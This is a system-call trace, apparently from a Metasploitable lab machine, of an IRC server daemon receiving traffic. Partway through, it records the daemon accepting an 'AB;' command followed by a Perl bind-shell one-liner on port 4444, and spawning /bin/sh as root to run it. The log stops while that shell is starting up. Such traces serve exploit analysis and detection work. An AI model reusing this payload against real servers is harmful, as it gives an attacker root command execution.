4519  07:15:04.323361 select(1024, [2 3 4 7 9], [], NULL, {0, 740000}) = 1 (in [4], left {0, 650000})
4519  07:15:04.409852 clock_gettime(CLOCK_MONOTONIC, {1314, 226861166}) = 0
4519  07:15:04.409852 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 44
4519  07:15:04.409852 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.409853 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.409853 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.409853 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.409853 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.409876 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.409896 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.409967 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410002 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410023 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410061 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410094 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410113 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410134 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410153 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410172 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410191 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410211 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410231 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410270 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410290 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410310 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.410334 gettimeofday({1495624504, 410339}, NULL) = 0
4519  07:15:04.410350 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 990000})
4519  07:15:04.419634 clock_gettime(CLOCK_MONOTONIC, {1314, 236643588}) = 0
4519  07:15:04.419635 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 70
4519  07:15:04.419673 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419700 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419723 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419744 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419764 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419785 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419805 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419825 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419845 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419865 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419885 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419917 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.419967 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420002 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420022 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420053 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420074 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420095 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420116 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420138 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420158 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420177 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.420200 time(NULL)        = 1495624504
4519  07:15:04.420213 time(NULL)        = 1495624504
4519  07:15:04.420229 gettimeofday({1495624504, 420235}, NULL) = 0
4519  07:15:04.420246 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:04.420291 clock_gettime(CLOCK_MONOTONIC, {1314, 237306512}) = 0
4519  07:15:04.420307 gettimeofday({1495624504, 420312}, NULL) = 0
4519  07:15:04.420322 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 920000})
4519  07:15:04.501448 clock_gettime(CLOCK_MONOTONIC, {1314, 318473503}) = 0
4519  07:15:04.501478 accept(2, 0, NULL) = 5
4519  07:15:04.501508 getpeername(5, {sa_family=AF_INET, sin_port=htons(44783), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:15:04.501555 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:15:04.501578 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:15:04.501598 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:15:04.501616 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:15:04.501633 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:15:04.501651 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:15:04.501668 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:15:04.501690 clock_gettime(CLOCK_MONOTONIC, {1314, 318705669}) = 0
4519  07:15:04.501707 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:15:04.501725 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:15:04.501740 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:15:04.501752 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:15:04.501766 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:15:04.501787 send(6, "\374{\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:15:04.501861 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:15:04.501938 gettimeofday({1495624504, 501946}, NULL) = 0
4519  07:15:04.501958 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:15:04.504783 clock_gettime(CLOCK_MONOTONIC, {1314, 321791868}) = 0
4519  07:15:04.504783 recvfrom(6, "\374{\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\241\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:15:04.504783 close(6)          = 0
4519  07:15:04.504783 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:15:04.504784 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:15:04.505528 time(NULL)        = 1495624504
4519  07:15:04.505557 time(NULL)        = 1495624504
4519  07:15:04.505569 gettimeofday({1495624504, 505573}, NULL) = 0
4519  07:15:04.505581 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:04.505714 clock_gettime(CLOCK_MONOTONIC, {1314, 322728466}) = 0
4519  07:15:04.505726 gettimeofday({1495624504, 505730}, NULL) = 0
4519  07:15:04.505737 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 590000})
4519  07:15:04.909831 clock_gettime(CLOCK_MONOTONIC, {1314, 726840357}) = 0
4519  07:15:04.909831 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:15:04.909832 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909832 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909832 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909832 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909833 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909835 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909850 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909864 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909878 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909891 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909905 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909919 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909932 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909946 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909960 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909973 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.909987 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.910000 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.910045 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.910077 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.910091 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.910104 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.910125 gettimeofday({1495624504, 910129}, NULL) = 0
4519  07:15:04.910137 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:15:04.910178 clock_gettime(CLOCK_MONOTONIC, {1314, 727191447}) = 0
4519  07:15:04.910190 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:15:04.910218 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:15:04.910239 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:15:04.910252 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:15:04.910267 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 6690
6690  07:15:04.910340 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
6690  07:15:04.910354 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
6690  07:15:04.910365 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6690  07:15:04.910379 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
6690  07:15:04.910489 brk(0)            = 0x80f9000
6690  07:15:04.910540 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.910574 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc3000
6690  07:15:04.910591 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.910609 open("/etc/ld.so.cache", O_RDONLY) = 1
6690  07:15:04.910622 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6690  07:15:04.910659 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fbb000
6690  07:15:04.910670 close(1)          = 0
6690  07:15:04.910680 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.910696 open("/lib/libncurses.so.5", O_RDONLY) = 1
6690  07:15:04.910709 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
6690  07:15:04.910804 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
6690  07:15:04.910821 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f8b000
6690  07:15:04.910834 mmap2(0xb7fb8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7fb8000
6690  07:15:04.910851 close(1)          = 0
6690  07:15:04.910863 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.910877 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
6690  07:15:04.910891 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
6690  07:15:04.910981 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
6690  07:15:04.910998 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f87000
6690  07:15:04.911036 mmap2(0xb7f89000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f89000
6690  07:15:04.911070 close(1)          = 0
6690  07:15:04.911082 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.911096 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
6690  07:15:04.911110 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
6690  07:15:04.911203 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
6690  07:15:04.911220 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f86000
6690  07:15:04.911234 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e37000
6690  07:15:04.911245 mmap2(0xb7f80000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f80000
6690  07:15:04.911260 mmap2(0xb7f83000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f83000
6690  07:15:04.911274 close(1)          = 0
6690  07:15:04.911296 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e36000
6690  07:15:04.911308 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e366b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
6690  07:15:04.911365 mprotect(0xb7f80000, 4096, PROT_READ) = 0
6690  07:15:04.911409 munmap(0xb7fbb000, 29913) = 0
6690  07:15:04.911435 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6690  07:15:04.911449 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
6690  07:15:04.911470 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcb9e70) = -1 ENOTTY (Inappropriate ioctl for device)
6690  07:15:04.911500 brk(0)            = 0x80f9000
6690  07:15:04.911542 brk(0x80fa000)    = 0x80fa000
6690  07:15:04.911572 brk(0x80fb000)    = 0x80fb000
6690  07:15:04.911589 getuid32()        = 0
6690  07:15:04.911599 getgid32()        = 0
6690  07:15:04.911608 geteuid32()       = 0
6690  07:15:04.911617 getegid32()       = 0
6690  07:15:04.911631 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6690  07:15:04.911644 time(NULL)        = 1495624504
6690  07:15:04.911657 brk(0x80fc000)    = 0x80fc000
6690  07:15:04.911672 brk(0x80fd000)    = 0x80fd000
6690  07:15:04.911691 open("/proc/meminfo", O_RDONLY) = 1
6690  07:15:04.911713 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
6690  07:15:04.911730 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc2000
6690  07:15:04.911742 read(1, "MemTotal:      1035240 kB\nMemFree:        591000 kB\nBuffers:         64204 kB\nCached:         223764 kB\nSwapCached:          0 kB\nActive:         253148 kB\nInactive:       163744 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        590760 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5556 kB\nWriteback:           0 kB\nAnonPages:      128976 kB\nMapped:          52008 kB\nSlab:            15900 kB\nSReclaimable:     7804 kB\nSUnreclaim:       8096 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
6690  07:15:04.911831 close(1)          = 0
6690  07:15:04.911842 munmap(0xb7fc2000, 4096) = 0
6690  07:15:04.911854 brk(0x80fe000)    = 0x80fe000
6690  07:15:04.911881 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
6690  07:15:04.911894 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
6690  07:15:04.911910 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6690  07:15:04.911922 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6690  07:15:04.911934 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
6690  07:15:04.911946 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
6690  07:15:04.911960 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6690  07:15:04.911972 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6690  07:15:04.911985 uname({sys="Linux", node="metasploitable", ...}) = 0
6690  07:15:04.912091 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6690  07:15:04.912110 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6690  07:15:04.912129 brk(0x8100000)    = 0x8100000
6690  07:15:04.912141 getcwd("/etc/unreal", 4096) = 12
6690  07:15:04.912155 getpid()          = 6690
6690  07:15:04.912172 getppid()         = 4519
6690  07:15:04.912187 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6690  07:15:04.912207 stat64("/sbin/sh", 0xbfcb9e48) = -1 ENOENT (No such file or directory)
6690  07:15:04.912220 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
6690  07:15:04.912238 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
6690  07:15:04.912262 socket(PF_FILE, SOCK_STREAM, 0) = 1
6690  07:15:04.912275 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
6690  07:15:04.912287 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
6690  07:15:04.912310 close(1)          = 0
6690  07:15:04.912322 socket(PF_FILE, SOCK_STREAM, 0) = 1
6690  07:15:04.912332 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
6690  07:15:04.912342 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
6690  07:15:04.912360 close(1)          = 0
6690  07:15:04.912374 open("/etc/nsswitch.conf", O_RDONLY) = 1
